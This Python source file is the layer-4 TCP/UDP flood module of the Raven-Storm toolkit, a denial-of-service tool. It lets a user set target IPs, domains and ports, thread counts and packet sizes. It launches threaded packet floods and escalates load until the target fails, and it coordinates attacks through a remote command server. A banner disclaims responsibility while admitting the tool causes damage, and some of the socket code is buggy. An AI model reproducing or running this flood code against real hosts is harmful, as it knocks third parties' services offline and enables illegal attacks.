# 2020
# The Raven-Storm Toolkit was programmed and developed by Taguar258.
# The Raven-Storm Toolkit is published under the MIT Licence.
# The Raven-Storm Toolkit is based on the CLIF-Framework.
# The CLIF-Framework is programmed and developed by Taguar258.
# The CLIF-Framework is published under the MIT Licence.

import socket
from os import getcwd, name, path, system
from random import choice
from sys import version
from threading import Thread
from time import sleep, time

import requests
from CLIF_Framework.framework import event, tools  # noqa: I900

event = event()
tools = tools()


class Main:
	def __init__(selfie, console):  # noqa: N805
		global self
		global var
		self = selfie
		var = console  # noqa: VNE002

		self._add_commands()

		# Colors
		var.C_None = "\x1b[0;39m"
		var.C_Bold = "\x1b[1;39m"
		var.C_Green = "\x1b[32m"
		var.C_Violet = "\x1b[34m"
		var.C_Dark_Blue = "\x1b[35m"
		var.C_Red = "\x1b[31m"

		var.port = [80]  # Port 80 protocol == TCP
		var.threads = 160
		var.ip = [""]
		var.socketmethod = "TCP"  # / UDP
		var.sleep = 0
		var.outtxt = True
		var.outtxtmute = False
		var.message = "hey, it's me rs."
		var.messagezw = var.message
		var.rtxt = 1
		var.stress = False
		var.timeforstress = 1
		var.autostart = 0
		var.autostop = 0
		var.autostep = 0
		var.autostarttime = 0  # Will be used as a variable for autostop
		var.runactive = True
		var.get_url = ""

		var.l4_debug = False
		var.stoped_threads = 0

		var.user_agents = ["Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)", "Mozilla/5.0 (Linux; U; Android 2.3; en-us) AppleWebKit/999+ (KHTML, like Gecko) Safari/999.9", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; pl-pl) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5", "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:24.0) Gecko/20100101 Firefox/24.0", "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:25.0) Gecko/20100101 Firefox/25.0", "Mozilla/5.0 (X11; NetBSD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; nb-no) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5", "Opera/9.80 (Windows NT 6.1; U; pl) Presto/2.7.62 Version/11.00", "Mozilla/5.0 (Windows NT 6.1; rv:27.3) Gecko/20130101 Firefox/27.3", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246", "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))", "Opera/9.80 (Windows NT 6.1; U; zh-cn) Presto/2.6.37 Version/11.00", "Opera/9.80 (Windows NT 6.1; U; ko) Presto/2.7.62 Version/11.00", "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0", "Mozilla/5.0 (Windows NT 6.1; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.90 Safari/537.36", "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; fr-fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5", "Mozilla/5.0 (iPhone; U; ru; CPU iPhone OS 4_2_1 like Mac OS X; fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5", "Opera/9.80 (X11; Linux x86_64; U; pl) Presto/2.7.62 Version/11.00", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3 like Mac OS X; en-gb) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8F190 Safari/6533.18.5", "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30", "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)", "Opera/9.80 (X11; Linux i686; U; it) Presto/2.7.62 Version/11.00", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:24.0) Gecko/20100101 Firefox/24.0", "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:27.0) Gecko/20121011 Firefox/27.0", "Mozilla/5.0 (Linux; U; Android 4.0.3; de-ch; HTC Sensation Build/IML74K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30", "Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)", "Mozilla/5.0 (X11; CrOS i686 3912.101.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.116 Safari/537.36", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01", "Mozilla/5.0 (iPhone; U; fr; CPU iPhone OS 4_2_1 like Mac OS X; fr) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148a Safari/6533.18.5", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_2_1 like Mac OS X; ru-ru) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5", "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_1 like Mac OS X; zh-tw) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8G4 Safari/6533.18.5"]

	def _add_commands(self):
		event.commands(self.exit_console, ["exit", "quit", "e", "q"])
		event.command(self.help)

		event.commands(self.run_shell, ".")
		event.commands(self.debug, "$")

		event.commands(self.show_values, ["values", "ls"])

		event.help_comment("|\n|-- Main commands:")
		event.help("port", "Set the target's port.")
		event.help("threads", "Set the number of threads.")
		event.help("ip", "Set the target's IP.")
		event.help("web", "Target the ip of a domain.")
		event.help("method", "Change attack method between UPD, TCP.")
		event.help("sleep", "Set the time delay between each packet send.")
		event.help("outtxt", "Output each packets send status: enable/disable.")
		event.help("mute", "Do not output the connection reply.")
		event.help(["values", "ls"], "Show all selected options.")
		event.help("run", "Start the attack.")
		event.help_comment("|\n|-- Set Send-text:")
		event.help("message", "Set the packt's message.")
		event.help("repeat", "Repeat the target's message specific times.")
		event.help("mb", "Send specified amount of MB packtes to server.")
		event.help("get", "Define the GET Header.")
		event.help("agent", "Define a user agent instead of a random ones.")
		event.help_comment("|\n|-- Stress Testing:")
		event.help("stress", "Enable the Stress-testing mode.")
		event.help("st wait", "Set the time between each stress level.")
		event.help_comment("|\n|-- Multiple:")
		event.help("ips", "Set multple ips to target.")
		event.help("webs", "Set multple domains to target.")
		event.help("ports", "Attack multiple ports.")
		event.help_comment("|\n|-- Automation:")
		event.help("auto start", "Set the delay before the attack should start.")
		event.help("auto step", "Set the delay between the next thread to activate.")
		event.help("auto stop", "Set the delay after the attack should stop.")

	def banner(self):
		system("clear || cls")
		print(("""C_B----------------------------------------------------------C_W
THE CREATOR DOES NOT TAKE ANY RESPONSIBILITY FOR DAMAGE CAUSED.
THE USER ALONE IS RESPONSIBLE, BE IT: ABUSING RAVEN-STORM
TO FIT ILLEGAL PURPOSES OR ACCIDENTAL DAMAGE CAUSED BY RAVEN-STORM.
BY USING THIS SOFTWARE, YOU MUST AGREE TO TAKE FULL RESPONSIBILITY
FOR ANY DAMAGE CAUSED BY RAVEN-STORM.
EVERY ATTACK WILL CAUSE TEMPORARY DAMAGE, BUT LONG-TERM DAMAGE IS
DEFFINITIFLY POSSIBLE.
RAVEN-STORM SHOULD NOT SUGGEST PEOPLE TO PERFORM ILLEGAL ACTIVITIES.
C_B----------------------------------------------------------C_W""").replace("C_W", var.C_None).replace("C_B", var.C_Bold))
		self.help()

	def exit_console(self):
		print("Have a nice day.")
		quit()

	def run_shell(self, command):
		print("")
		system(tools.arg("Enter shell command: ", ". ", command))
		print("")

	def debug(self, command):
		print("")
		eval(tools.arg("Enter debug command: ", "$ ", command))
		print("")

	@event.command
	def clear():
		system("clear || cls")

	@event.event
	def on_ready():
		self.banner()

	@event.event
	def on_command_not_found(command):
		print("")
		print("The command you entered does not exist.")
		print("")

	def check_session(self):
		if var.session[1][0] and len(var.session[1][1]) >= 1:
			if len(var.session[1][1][0]) >= 1:
				run_following = [var.session[1][1][0][0], var.session[1][1][0][0]]
				var.session[1][1][0] = var.session[1][1][0][1:]
			else:
				var.session[1][1] = var.session[1][1][1:]
				run_following = [var.session[1][1][0][0], var.session[1][1][0][0]]
				var.session[1][1][0] = var.session[1][1][0][1:]
			var.run_command = run_following

	@event.event
	def on_input():
		self.check_session()
		if var.server[0] and not var.server[1]:
			while True:
				data = requests.post((var.server[2] + ("get/com%s" % var.server[4])), data={"password": var.server[3]}).text
				if data != "500":
					var.server[4] = var.server[4] + 1
					var.run_command = [data, data]
					print(var.ps1 + "\r")
					break
				else:
					sleep(1)

	@event.event
	def on_interrupt():
		print("")
		var.stop()

	@event.event
	def on_command(command):
		if var.session[0][0]:
			var.session[0][1].write(command + "\n")
		if var.server[0] and var.server[1]:
			status = requests.post((var.server[2] + "set/com"), data={"password": var.server[3], "data": command}).text
			if status != "200":
				print("")
				print("An error occured, while sending commands to the server.")
				print("")

	@event.command
	def debug():
		var.l4_debug = True
		print("")
		print("Debugging mode enabled.")
		print("")

	def help(self):
		event.help_title("\x1b[1;39mUDP/TCP Flood Help:\x1b[0;39m")
		tools.help("|   |-- ", " :: ", event)
		print("")

	@event.command
	def port(command):
		print("")
		try:
			var.port = [int(tools.arg("Port: ", "port ", command))]
		except Exception as e:
			print("There was an error while executing.", e)
		print("")

	@event.command
	def threads(command):
		print("")
		try:
			var.threads = int(tools.arg("Threads: ", "threads ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print("")

	@event.command
	def ip(command):
		print("")
		var.ip = [tools.arg("Target: ", "ip ", command)]
		if "." not in var.ip[0]:
			print("This IP does not exist.")
		print("")

	@event.command
	def web(command):
		print(" ")
		try:
			webtoip = tools.arg("Website: ", "web ", command)
			webtoip = webtoip.replace("http://", "")
			webtoip = webtoip.replace("https://", "")
			webtoiptxt = str(socket.gethostbyname(webtoip))
			var.ip = [webtoiptxt]
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def method(command):
		print("")
		if var.socketmethod == "TCP":
			var.socketmethod = "UDP"
			print("Method changed to UDP.")
		else:
			var.socketmethod = "TCP"
			print("Method changed to TCP.")
		print("")

	@event.command
	def sleep(command):
		print("")
		try:
			var.sleep = int(tools.arg("Delay in seconds: ", "sleep ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print("")

	@event.command
	def outtxt(command):
		print(" ")
		if var.outtxt:
			print("The output has been reduced.")
			var.outtxt = False
		else:
			print("The output has been set to normal.")
			var.outtxt = True
		print(" ")

	@event.command
	def mute(command):
		print(" ")
		if var.outtxtmute:
			print("The output has been disabled.")
			var.outtxtmute = False
		else:
			print("The output has been enabled.")
			var.outtxtmute = True
		print(" ")

	@event.command
	def message(command):
		print("")
		var.message = tools.arg("Message: ", "message ", command)
		var.rtxt = 1
		print("")

	@event.command
	def get(command):
		print("")
		var.get_url = tools.arg("GET Header: ", "get ", command)
		print("")

	@event.command
	def repeat(command):
		print(" ")
		try:
			rtxtzw = var.rtxt
			var.rtxt = int(tools.arg("Repeat message x times: ", "repeat ", command))
			if var.rtxt < 1:
				print("There was an error while executing.")
			else:
				if rtxtzw < var.rtxt:
					var.messagezw = var.message
					var.message = (str(var.message) * int(var.rtxt))
				else:
					var.message = (str(var.messagezw) * int(var.rtxt))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def mb(command):
		print(" ")
		try:
			setmb = int(tools.arg("Size of Packet in MB: ", "mb ", command))
			setmb = int(setmb / 0.000001)
			var.message = ("r" * setmb)
			var.rtxt = setmb
			var.messagezw = "r"
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def stress(command):
		print(" ")
		if var.stress:
			print("The stress mode has been disabled.")
			var.stress = False
		else:
			print("The stress mode has been enabled.")
			var.stress = True
		print(" ")

	@event.command
	def st_wait(command):
		print("")
		try:
			var.timeforstress = int(tools.arg("Delay in seconds: ", "st wait ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print("")

	@event.command
	def ips(command):
		print("")
		var.ip = tools.arg("Targets (Seperated by ', '): ", "ips ", command).split(", ")
		for ip in var.target:
			if "." not in ip:
				print("This IP does not exist.")
		print("")

	@event.command
	def ports(command):
		print("")
		try:
			var.port = tools.arg("Ports (Seperated by ', '): ", "ports ", command).split(", ")
			for port in var.port:
				if isinstance(port, int):
					print("Entered ports cannot be used.")
		except Exception as e:
			print("There was an error while executing.", e)
		print("")

	@event.command
	def webs(command):
		print(" ")
		try:
			webtoip = tools.arg("Websites (Seperated by ', '): ", "webs ", command).split(", ")
			for pos, web in enumerate(webtoip):
				webtoip[pos] = web.replace("http://", "")
				webtoip[pos] = webtoip[pos].replace("https://", "")
				webtoip[pos] = str(socket.gethostbyname(webtoip[pos]))
			var.ip = webtoip
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def auto_step(command):
		print(" ")
		try:
			var.autostep = int(tools.arg("Delay for next thread to activate (in Seconds): ", "auto step ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def auto_start(command):
		print(" ")
		try:
			var.autostart = int(tools.arg("Delay for attack to start (in Seconds): ", "auto start ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def auto_stop(command):
		print(" ")
		try:
			var.autostop = int(tools.arg("Stop the attack after x seconds: ", "auto stop ", command))
		except Exception as e:
			print("There was an error while executing.", e)
		print(" ")

	@event.command
	def agent(command):
		print(" ")
		var.user_agents = [tools.arg("Enter a user agent: ", "agent ", command)]
		print(" ")

	def show_values(self):
		print("")
		print("Ports: %s" % var.port)
		print("Threads: %s" % var.threads)
		print("Targets: %s" % var.ip)
		print("Method: %s" % var.socketmethod)
		print("Time between each packet: %s" % var.sleep)
		print("Output: %s" % var.outtxt)
		print("Muted: %s" % var.outtxtmute)
		print("Packet message: %s" % var.message[:15])
		print("Repeat packet text: %s" % var.rtxt)
		print("Stress-Test mode: %s" % var.stress)
		print("Stress-Test level duration: %s" % var.timeforstress)
		print("Start Delay: %s" % var.autostart)
		print("Stop after x seconds: %s" % var.autostop)
		print("Time between threads: %s" % var.autostep)
		if len(var.user_agents) == 1:
			print("User Agent: %s" % var.user_agents[0])
		if var.get_url != "":
			print("GET Header: %s" % var.get_url)
		print("")

	def stresstest(self):
		print(" ")
		print("Time between: %s" % str(var.timeforstress))
		print("Using %s threads per round" % str(var.threads))
		print("To stop the attack press: CTRL + C")
		print(" ")
		sleep(2)
		while True:
			for thread in range(var.threads):
				try:
					t = Thread(target=self.ddos)
					t.start()
				except Exception:
					print("\x1b[0;39mFailed to start a thread.")
			sleep(var.timeforstress)
			if var.stresserror:
				print(" ")
				print("Stopped at %s threads!" % (str(var.stresstestvar * var.threads)))
				print(" ")
				var.runactive = False
				quit()
			else:
				var.stresstestvar += 1

	def ddos(self):
		mesalready = False
		if var.get_url == "":
			var.get_url = var.ip
		packet = ("GET /%s HTTP/1.1\r\nHost: %s\r\n User-Agent: %s\r\nConnection: Keep-Alive\r\nAccept-Language: en-us\r\nAccept-Encoding: gzip, deflate\r\n%s\r\n\r\n" % (var.get_url, var.ip, choice(var.user_agents), var.message)).encode("utf-8")
		if not var.outtxtmute:
			print("Thread started!")
		if var.socketmethod == "UDP":
			mysocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		else:
			mysocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
		while var.runactive:
			for ipvalue in var.ip:
				for portvalue in var.port:
					try:
						if var.socketmethod == "TCP":
							mysocket.connect((ipvalue, portvalue))
						else:
							try:
								mysocket.bind((ipvalue, portvalue))
							except Exception:
								pass
						if var.socketmethod == "TCP":
							mysocket.send(packet)
						try:
							mysocket.sendto(packet, (ipvalue, portvalue))
						except Exception:
							mysocket.send(packet)
						if var.outtxt:
							if not mesalready:
								mesalready = True
								print("\nSuccess for %s with port %s!" % (ipvalue, portvalue))
						# sleep(sleepy)
						var.command_log.append("Sucessful execution.")
					except socket.error as ex:
						if not var.outtxtmute:
							mesalready = False
							print("\nTarget %s with port %s not accepting request!" % (ipvalue, portvalue))
						var.command_log.append("ERROR: %s" % ex)
						if var.l4_debug:
							print("ERROR: %s" % ex)
						if var.stress:
							var.stresserror = True
						if var.socketmethod == "TCP":
							try:
								mysocket.close()
							except Exception:
								pass

			if int(var.autostop) != 0:
				autoendtime = time()
				autotimer = (int(autoendtime) - int(var.autostarttime))
				if var.autostop <= autotimer:
					print("\x1b[0;39mAuto Stop")
					var.runactive = False
					quit()
		var.stoped_threads += 1

	@event.command
	def run(command):
		print("")
		if var.ip != "":
			def execute():
				print("")
				print("To stop the attack press: ENTER or CRTL + C")
				sleep(3)
				sleep(var.autostart)
				if var.stress:
					if len(var.target) == 1 and len(var.port) == 1:
						self.stresstest()
					else:
						print("Do not use multiple targets/ports in the Stress-Testing mode.")
				else:  # Normal Mode
					if var.autostop != 0:
						var.autostarttime = time()
					for thread in range(var.threads):
						try:
							t = Thread(target=self.ddos)
							sleep(var.autostep)
							t.start()
						except Exception:
							print("Could not start thread %s." % thread)

				def reset_attack():
					print("Stopping threads...")
					var.runactive = False
					sleep(2)
					while True:
						if var.stoped_threads == var.threads:
							break
						else:
							sleep(1)

					if var.l4_debug:
						print("Saving debugging log...")
						output_to = path.join(getcwd(), "l4_debug_log.txt")

						write_method = "a"
						if path.isfile(output_to):
							write_method = "a"
						else:
							write_method = "w"

						output_file = open(output_to, write_method)
						if write_method == "a":
							output_file.write("------------- New Log -------------")
						output_file.write(str(name + "\n"))
						output_file.write(str(version + "\n"))
						output_file.write(str("\n".join(var.command_log)))
						output_file.close()
					print("Done.")
					quit()

				def check_stopped_execution():
					while True:
						data = requests.post((var.server[2] + "get/agreed"), data={"password": var.server[3]}).text
						if data != "True":
							reset_attack()
							break
						else:
							sleep(1)
				try:
					if var.server[0] and var.server[0]:
						rec_t = Thread(target=check_stopped_execution)
						rec_t.start()
					input("\r")
				except KeyboardInterrupt:
					pass

				if var.server[0] and var.server[1]:
					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
					if status != "200":
						print("An error occured, while sending data to the server.")

				reset_attack()

			if var.server[0] and not var.server[1]:
				while True:
					data = requests.post((var.server[2] + "get/agreed"), data={"password": var.server[3]}).text
					if data == "True":
						execute()
						break
					else:
						sleep(1)
			elif not tools.question("\nDo you agree to the terms of use?"):
				print("Agreement not accepted.")
				quit()
			else:
				if var.server[0] and var.server[1]:
					if tools.question("\nWould you like to use the host as part of the ddos?"):
						status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
						if status != "200":
							print("An error occured, while sending data to the server.")
						execute()
					else:
						status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
						if status != "200":
							print("An error occured, while sending data to the server.")
						try:
							print("[Press Enter to stop the attack.]")
						except KeyboardInterrupt:
							pass
						status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
						if status != "200":
							print("An error occured, while sending data to the server.")
				else:
					execute()
		else:
			print("No target has been defined.")
		print("")


def setup(console):
	console.ps1 = "L4> "
	console.add(Main(console), event)
